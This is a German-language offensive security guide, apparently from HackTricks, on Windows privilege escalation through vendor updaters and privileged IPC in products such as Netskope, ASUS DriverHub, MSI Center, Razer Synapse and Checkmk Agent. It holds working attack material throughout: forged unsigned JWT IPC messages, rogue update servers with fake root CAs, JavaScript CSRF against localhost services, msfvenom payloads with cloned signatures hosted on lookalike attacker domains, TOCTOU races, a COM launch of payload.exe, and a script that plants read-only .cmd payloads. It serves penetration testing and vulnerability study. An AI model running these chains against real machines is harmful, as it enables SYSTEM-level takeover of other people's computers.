# Missbrauch von Enterprise-Auto-Updatern und privilegiertem IPC (z. B. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse von Windows-Local-Privilege-Escalation-Ketten, die bei Enterprise-Endpoint-Agents und Updatern gefunden wurden, die eine leicht zugängliche IPC-Schnittstelle und einen privilegierten Update-Ablauf bereitstellen. Ein repräsentatives Beispiel ist Netskope Client für Windows < R129 (CVE-2025-0309), bei dem ein Benutzer mit niedrigen Privilegien die Registrierung zu einem vom Angreifer kontrollierten Server umleiten und anschließend ein schädliches MSI bereitstellen kann, das der SYSTEM-Dienst installiert.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Zentrale Ideen, die sich auf ähnliche Produkte übertragen lassen:
- Missbrauche das Localhost-IPC eines privilegierten Dienstes, um eine erneute Registrierung oder Neukonfiguration auf einem Angreifer-Server zu erzwingen.
- Implementiere die Update-Endpunkte des Herstellers, liefere eine gefälschte Trusted Root CA aus und verweise den Updater auf ein schädliches, „signiertes“ Paket.
- Umgehe schwache Signer-Prüfungen (CN-Allow-Lists), optionale Digest-Flags und laxe MSI-Eigenschaften.
- Wenn IPC „verschlüsselt“ ist, leite Schlüssel und IV aus öffentlich lesbaren Maschinenkennungen in der Registry ab.
- Wenn der Dienst Aufrufer anhand von Image-Pfad/Prozessname einschränkt, injiziere Code in einen zugelassenen Prozess oder starte einen Prozess angehalten und lade deine DLL über eine minimale Änderung am Thread-Kontext.

Benutzerdefinierte lokale TCP-Dienste verdienen dieselbe Prüfung ihrer Identität und Eingabegrenzen, auch wenn sie eine PIN oder andere Anwendungsanmeldedaten erfordern. Ordne den Listener seinem Prozess und dem effektiven Dienstkonto zu. Prüfe dann die genaue bereitgestellte Binärdatei/Version und ob aufruferkontrollierte Felder längengeprüft werden, bevor sie in feste Puffer kopiert oder zum Erstellen eines untergeordneten Prozessbefehls verwendet werden. [Microsofts Anleitung zu Pufferüberläufen](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) erklärt, warum ungeprüfte externe Eingaben in privilegiertem nativen Code gefährlich sind. Ein Loopback-Listener, hartcodierte Anmeldedaten oder ein Prozessname allein belegen weder Speicherbeschädigung noch SYSTEM-Ausführung; Erreichbarkeit, Autorisierung, Codepfad und Schutzmaßnahmen sind weiterhin separate Bedingungen. Beschränke die routinemäßige Untersuchung auf passive Methoden, statt einem laufenden Dienst Eingaben in Crash-Länge zu senden.

---
## 1) Registrierung über localhost-IPC auf einen Angreifer-Server umleiten

Viele Agents enthalten einen User-Mode-UI-Prozess, der über localhost-TCP mit JSON mit einem SYSTEM-Dienst kommuniziert.

Bei Netskope beobachtet:
- UI: stAgentUI (niedrige Integrität) ↔ Dienst: stAgentSvc (SYSTEM)
- IPC-Befehls-ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Ablauf des Exploits:
1) Erstelle ein JWT-Registrierungstoken, dessen Claims den Backend-Host steuern (z. B. AddonUrl). Verwende alg=None, sodass keine Signatur erforderlich ist.
2) Sende die IPC-Nachricht, die den Provisioning-Befehl mit deinem JWT und Tenant-Namen aufruft:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Der Dienst beginnt, Anfragen für Enrollment/Config an deinen Rogue-Server zu senden, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Hinweise:
- Wenn die Caller-Verifizierung pfad-/namensbasiert ist, muss die Anfrage von einer zugelassenen Vendor-Binärdatei ausgehen (siehe §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Netzwerkexponierte Management-IPC

Diese Vertrauensgrenze beschränkt sich nicht immer auf localhost. Im gemeldeten Fall MyReport Updater 2.1.1 lauschte ein `LocalSystem`-Dienst auf allen Schnittstellen und akzeptierte eine nicht authentifizierte gRPC-Konfigurationsänderung für den Referenzhost, den Port und den Betriebsmodus. Für die Remote-Variante waren sowohl Netzwerkzugriff auf den Listener als auch ausgehender Zugriff des Dienstes auf den ausgewählten Referenzhost erforderlich. Bewerte diese Voraussetzungen getrennt davon, ob der spätere Paketablauf die Dateischreibgrenze überwinden kann.<sup>[[16]](#references)</sup>

---
## 2) Den Update-Kanal kapern, um Code als SYSTEM auszuführen

Sobald der Client mit deinem Server kommuniziert, implementiere die erwarteten Endpoints und leite ihn zu einem angreiferkontrollierten MSI. Typischer Ablauf:

1) /v2/config/org/clientconfig → Gib eine JSON-Konfiguration mit einem sehr kurzen Updater-Intervall zurück, z. B.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Liefert ein PEM-CA-Zertifikat zurück. Der Dienst installiert es im Trusted Root-Speicher des lokalen Computers.
3) /v2/checkupdate → Stellt Metadaten bereit, die auf ein bösartiges MSI und eine gefälschte Version verweisen.

Umgehung gängiger Prüfungen, die in freier Wildbahn zu beobachten sind:
- Signer-CN-Allow-List: Der Dienst prüft möglicherweise nur, ob der Subject-CN „netSkope Inc“ oder „Netskope, Inc.“ entspricht. Deine Rogue-CA kann ein Leaf-Zertifikat mit diesem CN ausstellen und das MSI signieren.
- CERT_DIGEST-Eigenschaft: Füge eine harmlose MSI-Eigenschaft namens CERT_DIGEST hinzu. Bei der Installation wird sie nicht durchgesetzt.
- Optionale Digest-Prüfung: Ein Konfigurations-Flag (z. B. check_msi_digest=false) deaktiviert zusätzliche kryptografische Validierung.

Ergebnis: Der SYSTEM-Dienst installiert dein MSI aus
C:\ProgramData\Netskope\stAgent\data\*.msi
und führt damit beliebigen Code als NT AUTHORITY\SYSTEM aus.<sup>[[1]](#references)[[2]](#references)</sup>

Lehre zur Umgehung von Patches: Wenn ein Anbieter als Reaktion eine kleine Auswahl „vertrauenswürdiger“ Domains zulässt, statt die Update-Quelle kryptografisch zu authentifizieren, solltest du nach anbietereigenen Redirectors oder Reverse-Proxys suchen, über die sich der Datenverkehr weiterhin steuern lässt. Im Fall von Netskope zeigten öffentliche Folgeuntersuchungen, dass sich eine Allow-List aus der R129-Ära weiterhin über `rproxy.goskope.com` missbrauchen ließ, der von Angreifern kontrollierte Azure-App-Service-Inhalte als Proxy weiterleitete. Betrachte Hostname-Allow-Lists als Hürde, nicht als Vertrauensgrenze.<sup>[[14]](#references)</sup>

Ein weiterer Fehlermodus sind **in sich konsistente, aber nicht authentifizierte Paketmetadaten**. Im Fall von MyReport lieferte eine vom Angreifer kontrollierte Referenz ein modifiziertes Archiv, während ein Vermittler die MD5-Digest- und Größenangaben des Anbieters änderte, bevor sie den Updater erreichten. Der Abgleich dieser Werte prüfte die Konsistenz der Antworten, nicht deren Herkunft vom Anbieter; eine MD5-Kollision war nicht erforderlich. Ein vom Aufrufer ausgewähltes Installationsverzeichnis machte die privilegierte Extraktion dann zu einer Dateischreibgrenze. Die daraus entstehende DLL-Ladeprimitive wird unter [Verkettung eines beliebigen Dateischreibvorgangs mit DLL-Hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack) behandelt.<sup>[[16]](#references)</sup>

---
## 3) Verschlüsselte IPC-Anfragen fälschen (falls vorhanden)

Ab R127 verpackte Netskope IPC-JSON in ein encryptData-Feld, das wie Base64 aussieht. Reverse Engineering ergab AES, dessen Schlüssel und IV aus Registry-Werten abgeleitet wurden, die für jeden Benutzer lesbar sind:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Angreifer können die Verschlüsselung nachbilden und gültige verschlüsselte Befehle von einem Standardbenutzerkonto aus senden.<sup>[[1]](#references)[[2]](#references)</sup> Allgemeiner Tipp: Wenn ein Agent plötzlich seine IPC „verschlüsselt“, solltest du unter HKLM nach Geräte-IDs, Produkt-GUIDs und Installations-IDs suchen, die als Schlüsselmaterial dienen könnten.

---
## 4) IPC-Aufrufer-Allow-Lists umgehen (Pfad-/Namensprüfungen)

Manche Dienste versuchen, den Kommunikationspartner zu authentifizieren, indem sie die PID der TCP-Verbindung ermitteln und den Image-Pfad bzw. -Namen mit den Allow-Lists der Anbieter-Binärdateien unter Program Files vergleichen (z. B. stagentui.exe, bwansvc.exe, epdlp.exe).

Zwei praktische Umgehungsmöglichkeiten:
- DLL-Injection in einen zugelassenen Prozess (z. B. nsdiag.exe) und IPC-Proxying von diesem Prozess aus.
- Einen zugelassenen Prozess im Suspended-Zustand starten und deine Proxy-DLL ohne CreateRemoteThread laden (siehe §5), um treiberseitig durchgesetzte Manipulationsschutzregeln zu erfüllen.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Manipulationsschutzfreundliche Injection: Suspended-Prozess + NtContinue-Patch

Produkte enthalten häufig einen Minifilter-/OB-Callbacks-Treiber (z. B. Stadrv), der gefährliche Rechte aus Handles zu geschützten Prozessen entfernt:
- Prozess: Entfernt PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: Beschränkt auf THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ein zuverlässiger User-Mode-Loader, der diese Einschränkungen berücksichtigt:
1) CreateProcess einer Anbieter-Binärdatei mit CREATE_SUSPENDED.
2) Hole Handles, die weiterhin zulässig sind: PROCESS_VM_WRITE | PROCESS_VM_OPERATION für den Prozess und ein Thread-Handle mit THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oder nur THREAD_RESUME, wenn du den Code an einem bekannten RIP patchst).
3) Überschreibe ntdll!NtContinue (oder einen anderen früh geladenen, garantiert gemappten Thunk) mit einem kleinen Stub, der LoadLibraryW mit dem Pfad deiner DLL aufruft und anschließend zurückspringt.
4) ResumeThread aufrufen, um deinen Stub im Prozess auszuführen und deine DLL zu laden.

Da du PROCESS_CREATE_THREAD oder PROCESS_SUSPEND_RESUME nie für einen bereits geschützten Prozess verwendet hast (du hast ihn selbst erstellt), wird die Richtlinie des Treibers eingehalten.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktische Tools
- NachoVPN (Netskope-Plugin) automatisiert eine Rogue-CA, das Signieren eines bösartigen MSI und stellt die benötigten Endpunkte bereit: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope ist ein benutzerdefinierter IPC-Client, der beliebige (optional AES-verschlüsselte) IPC-Nachrichten erstellt und die Injection in einen Suspended-Prozess enthält, um Nachrichten von einer zugelassenen Binärdatei auszusenden.<sup>[[4]](#references)</sup>

## 7) Schneller Triage-Ablauf für unbekannte Updater-/IPC-Angriffsflächen

Wenn du auf einen neuen Endpoint-Agent oder eine „Helper“-Suite für Motherboards stößt, reicht oft ein schneller Ablauf aus, um festzustellen, ob es sich um ein vielversprechendes Privesc-Ziel handelt:<sup>[[6]](#references)</sup>

1) Loopback-Listener auflisten und den Anbieterprozessen zuordnen:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Mögliche Named Pipes enumerieren:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Registry-gestützte Routingdaten auslesen, die von pluginbasierten IPC-Servern verwendet werden:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extrahiere zuerst Endpoint-Namen, JSON-Keys und Command-IDs aus dem User-Mode-Client. Gepackte Electron/.NET-Frontends leaken häufig das vollständige Schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Suchen Sie nach dem tatsächlichen Vertrauensprädikat, nicht nur nach dem Codepfad, der letztlich den Prozess startet:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Zu priorisierende Muster:
- `CryptQueryObject`/certificate parsing ohne `WinVerifyTrust` bedeutet meist, dass „Zertifikat vorhanden“ mit „Zertifikat vertrauenswürdig“ gleichgesetzt wurde. Dadurch werden certificate cloning oder andere fake-signer-Tricks möglich.
- Teilstring-/Suffix-Prüfungen für `Origin`, `Referer`, Download-URLs, Prozessnamen oder Signer-CNs sind keine Authentifizierung. `contains(".vendor.com")` ist meist mit vom Angreifer kontrollierten Lookalike-Domains ausnutzbar.
- Wenn die GUI mit niedrigen Rechten entscheidet, „die Datei ist vertrauenswürdig“, und der SYSTEM-Broker dieses Ergebnis lediglich übernimmt, lässt sich die Grenze oft vollständig umgehen, indem man die clientseitige DLL/JS patcht oder neu implementiert (Razer-artige getrennte Validierung).
- Wenn der Broker eine Payload nach `%TEMP%`/`C:\Windows\Temp` kopiert und sie anschließend von diesem Pfad aus validiert oder einplant, teste sofort auf TOCTOU-Austauschfenster und auf benachbarte Plugin-Module, die alternative `ExecuteTask()`-Wrapper mit schwächeren Prüfungen bereitstellen.<sup>[[6]](#references)</sup>

Bei Zielen mit vielen Named Pipes ist PipeViewer eine schnelle Möglichkeit, schwache DACLs und remote erreichbare Pipes zu finden, bevor du mit dem detaillierten Reverse Engineering des Protokolls beginnst.<sup>[[11]](#references)</sup>

Wenn das Ziel Aufrufer nur anhand der PID, des Image-Pfads oder des Prozessnamens authentifiziert, betrachte das als Hürde, nicht als Sicherheitsgrenze: Eine Injection in den legitimen Client oder eine Verbindung über einen Allowlist-Prozess reicht oft aus, um die Prüfungen des Servers zu bestehen. Speziell für Named Pipes behandelt [diese Seite zu Client-Impersonation und Pipe Abuse](named-pipe-client-impersonation.md) die Primitive ausführlicher.

Untersuche bei einem privilegierten **Cleanup- oder Restore-Broker** neben der Pipe-ACL auch die Vertrauensgrenze für Pfade. Ein Aufrufer mit niedrigeren Rechten kann möglicherweise ein Restore-Ziel auswählen oder ein bereitgestelltes Backup-Artefakt in einem gemeinsam genutzten Verzeichnis umbenennen, selbst wenn die Service-Executable und ihr Installationsverzeichnis geschützt sind. Prüfe getrennt, ob der Aufrufer den Restore-Befehl erreichen, die genaue bereitgestellte Eingabedatei oder den Dateinamen ändern kann, der Broker mit einer höheren Identität ausgeführt wird und der Restore-Vorgang tatsächlich in den ausgewählten geschützten Pfad schreibt. Ein beschreibbares Staging-Verzeichnis oder eine lesbare Pipe allein belegt keinen beliebigen privilegierten Schreibzugriff; die Zielzuordnung und das Verhalten des Service müssen durch Code Review oder kontrollierte Tests geprüft werden. Führe bei passiver Enumeration keinen unbekannten Cleanup-Befehl aus, da er Benutzerdateien löschen könnte.

---
## 8) Modulare Add-in-Broker, die nur anhand von Vendor-Signaturen authentifiziert werden (Lenovo-Vantage-Muster)

Eine neuere Variante, nach der es sich zu suchen lohnt, ist der **signed-client RPC broker**: Ein Lenovo-signierter Desktop-Prozess mit niedrigen Rechten kommuniziert mit einem SYSTEM-Service, und der Service leitet JSON-Befehle an eine Reihe von XML-beschriebenen Add-ins unter `%ProgramData%` weiter. Sobald Codeausführung **innerhalb eines beliebigen akzeptierten signierten Clients** erreicht ist, wird jeder Vertrag mit `runas="system"` Teil der Angriffsfläche.<sup>[[15]](#references)</sup>

Wertvolle Primitives aus der Lenovo-Vantage-Forschung:
- **Dem Aufrufer vertrauen, weil er vom Hersteller signiert ist**: Forschende erreichten einen authentifizierten Kontext, indem sie eine Lenovo-signierte EXE in ein beschreibbares Verzeichnis kopierten und einen DLL-Side-Load (`profapi.dll`) auslösten, sodass beliebiger Code in einem Client ausgeführt wurde, dem der Service bereits vertraute.
- **Manifestgesteuerte Erkundung der Angriffsfläche**: Add-ins werden unter `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` deklariert; mehrere Verträge werden als `SYSTEM` ausgeführt. Eine Enumeration dieser Manifeste zeigt daher oft schneller die tatsächlich privilegierten Verben als ein Reverse Engineering des Brokers selbst.
- **Fehler einzelner Befehle hinter dem authentifizierten Kanal**: Nachdem Forschende in den vertrauenswürdigen Client gelangt waren, fand öffentliche Forschung Path Traversal und Race Conditions in Update-/Install-Verben, Raw-SQL-Missbrauch in privilegierten Einstellungsdatenbanken sowie teilstringbasierte Registry-Pfadprüfungen, die Schreibzugriffe außerhalb der vorgesehenen Hive ermöglichten.

Nützliche Recon auf einem Ziel:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktische Erkenntnis: Wenn eine Helper-Suite einen Broker bereitstellt, der zuerst den **aufrufenden Prozess** authentifiziert und erst dann Aufrufe an Dutzende Plugin-/Add-in-Befehle weiterleitet, solltet ihr nicht nach dem Umgehen der Vertrauensprüfung am Eingang aufhören. Dumped die Manifest-/Vertragstabelle und fuzzed jeden Befehl mit hohen Berechtigungen einzeln; der authentifizierte Kanal verbirgt meist mehrere Fehler der zweiten Stufe.

---
## 1) Browser-zu-localhost-CSRF gegen privilegierte HTTP-APIs (ASUS DriverHub)

DriverHub enthält einen HTTP-Dienst im Benutzermodus (ADU.exe) auf 127.0.0.1:53000, der Browser-Aufrufe erwartet, die von https://driverhub.asus.com kommen. Der Origin-Filter führt einfach `string_contains(".asus.com")` für den Origin-Header und für Download-URLs aus, die über `/asus/v1.0/*` verfügbar sind. Daher besteht jeder vom Angreifer kontrollierte Host wie `https://driverhub.asus.com.attacker.tld` die Prüfung und kann per JavaScript zustandsändernde Anfragen ausführen.<sup>[[6]](#references)</sup> Weitere Umgehungsmuster findet ihr unter [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md).

Praktischer Ablauf:
1) Registriert eine Domain, die `.asus.com` enthält, und hostet dort eine bösartige Webseite.
2) Verwendet `fetch` oder XHR, um einen privilegierten Endpunkt (z. B. `Reboot`, `UpdateApp`) unter `http://127.0.0.1:53000` aufzurufen.
3) Sendet den vom Handler erwarteten JSON-Body – das gepackte Frontend-JS zeigt das Schema unten.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Sogar die unten gezeigte PowerShell-CLI funktioniert, wenn der Origin-Header auf den vertrauenswürdigen Wert gefälscht wird:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Any browser visit to the Angreifer-Website wird dadurch zu einem lokalen CSRF mit 1 Klick (oder 0 Klicks über `onload`), der einen SYSTEM-Hilfsprozess steuert.

---
## 2) Unsichere Code-Signaturprüfung & Zertifikatsklonen (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` lädt beliebige, im JSON-Body definierte ausführbare Dateien herunter und speichert sie im Cache unter `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die Validierung der Download-URL verwendet dieselbe Teilzeichenfolgenlogik, sodass `http://updates.asus.com.attacker.tld:8000/payload.exe` akzeptiert wird. Nach dem Download prüft ADU.exe lediglich, ob die PE-Datei eine Signatur enthält und der Subject-String ASUS entspricht, bevor sie ausgeführt wird – es gibt weder `WinVerifyTrust` noch eine Chain-Validierung.

So lässt sich der Ablauf weaponizen:
1) Erstelle ein Payload (z. B. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klone den Signierer von ASUS in das Payload (z. B. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hoste `pwn.exe` auf einer ähnlich aussehenden `.asus.com`-Domain und löse UpdateApp über den obigen Browser-CSRF aus.

Da sowohl die Origin- als auch die URL-Filter auf Teilzeichenfolgen basieren und die Signaturprüfung nur Strings vergleicht, lädt DriverHub die Binärdatei des Angreifers herunter und führt sie mit erhöhten Rechten aus.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU in Copy/Execute-Pfaden des Updaters (MSI Center CMD_AutoUpdateSDK)

Der SYSTEM-Dienst von MSI Center stellt ein TCP-Protokoll bereit, bei dem jeder Frame aus `4-byte ComponentID || 8-byte CommandID || ASCII arguments` besteht. Die Core-Komponente (Component ID `0f 27 00 00`) enthält `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Der Handler:
1) Kopiert die angegebene ausführbare Datei nach `C:\Windows\Temp\MSI Center SDK.exe`.
2) Prüft die Signatur über `CS_CommonAPI.EX_CA::Verify` (der Zertifikat-Subject muss „MICRO-STAR INTERNATIONAL CO., LTD.“ entsprechen und `WinVerifyTrust` erfolgreich sein).
3) Erstellt einen geplanten Task, der die temporäre Datei mit vom Angreifer kontrollierten Argumenten als SYSTEM ausführt.

Die kopierte Datei wird zwischen der Überprüfung und `ExecuteTask()` nicht gesperrt. Ein Angreifer kann:
- Frame A senden, der auf eine legitime, von MSI signierte Binärdatei verweist (dadurch besteht die Signaturprüfung und der Task wird eingereiht).
- Mit wiederholten Frame-B-Nachrichten konkurrieren, die auf ein schädliches Payload verweisen und `MSI Center SDK.exe` direkt nach Abschluss der Überprüfung überschreiben.

Wenn der Scheduler den Task startet, führt er das überschriebene Payload als SYSTEM aus, obwohl die ursprüngliche Datei validiert wurde. Für eine zuverlässige Ausnutzung werden zwei Goroutines/Threads verwendet, die CMD_AutoUpdateSDK so lange spammen, bis das TOCTOU-Fenster gewonnen wird.<sup>[[6]](#references)</sup>

---
## 2) Missbrauch benutzerdefinierter SYSTEM-IPC und Impersonation (MSI Center + Acer Control Centre)

### MSI Center-TCP-Befehlssätze
- Jedes von `MSI.CentralServer.exe` geladene Plugin/jede DLL erhält eine Component ID, die unter `HKLM\SOFTWARE\MSI\MSI_CentralServer` gespeichert wird. Die ersten 4 Bytes eines Frames wählen diese Komponente aus und ermöglichen Angreifern, Befehle an beliebige Module weiterzuleiten.
- Plugins können eigene Task-Runner definieren. `Support\API_Support.dll` stellt `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` bereit und ruft `API_Support.EX_Task::ExecuteTask()` direkt **ohne Signaturprüfung** auf – jeder lokale Benutzer kann den Befehl auf `C:\Users\<user>\Desktop\payload.exe` richten und so deterministisch Code als SYSTEM ausführen.
- Das Mitschneiden von Loopback-Traffic mit Wireshark oder die Instrumentierung der .NET-Binärdateien in dnSpy macht die Zuordnung von Component zu Befehl schnell sichtbar; anschließend können benutzerdefinierte Go-/Python-Clients die Frames erneut senden.<sup>[[6]](#references)</sup>

### Benannte Acer Control Centre-Pipes und Impersonation-Levels
- `ACCSvc.exe` (SYSTEM) stellt `\\.\pipe\treadstone_service_LightMode` bereit; die diskretionäre ACL erlaubt Remote-Clients (z. B. `\\TARGET\pipe\treadstone_service_LightMode`). Das Senden der Befehls-ID `7` mit einem Dateipfad ruft die Prozessstart-Routine des Dienstes auf.
- Die Client-Bibliothek serialisiert zusammen mit den Argumenten ein spezielles Terminierungsbyte (113). Die dynamische Instrumentierung mit Frida/`TsDotNetLib` (Tipps zur Instrumentierung siehe [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) zeigt, dass der native Handler diesen Wert vor dem Aufruf von `CreateProcessAsUser` einem `SECURITY_IMPERSONATION_LEVEL` und einer Integrity-SID zuordnet.
- Wird 113 (`0x71`) durch 114 (`0x72`) ersetzt, gelangt die Ausführung in den generischen Zweig, der das vollständige SYSTEM-Token beibehält und eine High-Integrity-SID (`S-1-16-12288`) setzt. Die gestartete Binärdatei läuft daher uneingeschränkt als SYSTEM, sowohl lokal als auch rechnerübergreifend.
- In Kombination mit dem offengelegten Installer-Flag (`Setup.exe -nocheck`) lässt sich ACC auch auf Labor-VMs installieren und die Pipe ohne Hardware des Herstellers testen.<sup>[[6]](#references)</sup>

Diese IPC-Schwachstellen zeigen, warum Localhost-Dienste gegenseitige Authentifizierung erzwingen müssen (ALPC-SIDs, `ImpersonationLevel=Impersonation`-Filter, Token-Filterung) und warum die Hilfsfunktionen zum „Ausführen beliebiger Binärdateien“ aller Module dieselben Signaturprüfungen verwenden müssen.

---
## 3) COM/IPC-„Elevator“-Hilfsprogramme mit schwacher Validierung im User Mode (Razer Synapse 4)

Razer Synapse 4 ergänzte ein weiteres nützliches Muster in dieser Schwachstellenfamilie: Ein Benutzer mit niedrigen Rechten kann einen COM-Hilfsprozess über `RzUtility.Elevator` zum Starten eines Prozesses auffordern, während die Vertrauensentscheidung an eine User-Mode-DLL (`simple_service.dll`) delegiert wird, anstatt sie zuverlässig innerhalb der privilegierten Sicherheitsgrenze durchzusetzen.

Beobachteter Ausnutzungspfad:
- Erzeuge eine Instanz des COM-Objekts `RzUtility.Elevator`.
- Rufe `LaunchProcessNoWait(<path>, "", 1)` auf, um den Start mit erhöhten Rechten anzufordern.
- Im öffentlichen PoC wird die PE-Signaturprüfung in `simple_service.dll` vor dem Senden der Anfrage deaktiviert, sodass eine beliebige vom Angreifer gewählte ausführbare Datei gestartet werden kann.<sup>[[6]](#references)[[10]](#references)</sup>

Minimale PowerShell-Ausführung:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Allgemeine Erkenntnis: Wenn ihr „helper“-Suiten reverse-engineert, solltet ihr euch nicht auf localhost-TCP oder Named Pipes beschränken. Prüft, ob es COM-Klassen mit Namen wie `Elevator`, `Launcher`, `Updater` oder `Utility` gibt. Verifiziert anschließend, ob der privilegierte Dienst die Zieldatei tatsächlich selbst überprüft oder lediglich einem Ergebnis vertraut, das eine patchbare User-Mode-Client-DLL berechnet hat. Dieses Muster ist nicht auf Razer beschränkt: Jedes Design mit getrennter Zuständigkeit, bei dem der Broker mit hohen Berechtigungen eine Allow/Deny-Entscheidung der Seite mit niedrigen Berechtigungen übernimmt, ist eine mögliche Privesc-Angriffsfläche.


---
## Vorhersehbare Ausführung temporärer Skripte während einer MSI-Reparatur (Checkmk Agent / CVE-2024-0670)

Einige Windows-Agents führen privilegierte Aktionen noch immer aus, indem sie eine temporäre `.cmd`-Datei in `C:\Windows\Temp` schreiben und als `SYSTEM` ausführen. Ist der Dateiname vorhersehbar und erstellt der Dienst vorhandene Dateien nicht sicher neu, kann ein Benutzer mit niedrigen Berechtigungen die künftige temporäre Datei vorab **schreibgeschützt** erstellen. Dadurch führt der privilegierte Prozess vom Angreifer kontrollierte Inhalte statt seines eigenen Skripts aus.

Beobachtet in verwundbaren Checkmk-Agent-Builds:
- Temp-Muster: `cmk_all_<PID>_1.cmd`
- Betroffene Branches: `2.0.0`, `2.1.0`, `2.2.0`
- Auslöser: MSI-**Reparatur** des zwischengespeicherten Agent-Pakets<sup>[[8]](#references)[[9]](#references)</sup>

Praktischer Ablauf:
1. Schätzt einen realistischen PID-Bereich anhand aktueller Prozess-IDs oder der PID des laufenden Agents.
2. Schreibt eine kurze **ASCII**-`.cmd`-Payload (`Set-Content -Encoding Ascii` oder Umleitung über `cmd.exe`; vermeidet UTF-16-Ausgabe von PowerShell für Batch-Dateien).
3. Legt `C:\Windows\Temp\cmk_all_<PID>_1.cmd` für den möglichen PID-Bereich an und markiert jede Datei als schreibgeschützt.
4. Löst eine Reparatur des zwischengespeicherten MSI aus, sodass der privilegierte Dienst versucht, das temporäre Skript neu zu erstellen und anschließend auszuführen.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Wenn das anfällige Produkt mit Windows Installer installiert wurde, ordne die zufällig wirkende zwischengespeicherte MSI-Datei unter `C:\Windows\Installer` ihrem Produktnamen zu, bevor du die Reparatur auslöst:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Betriebshinweise:
- `qwinsta` ist nützlich, wenn `msiexec /fa` in einer nicht-interaktiven WinRM-Shell fehlschlägt und Sie herausfinden müssen, ob eine vorhandene Desktop-/getrennte Sitzung die Reparatur korrekt auslösen kann.<sup>[[7]](#references)</sup>
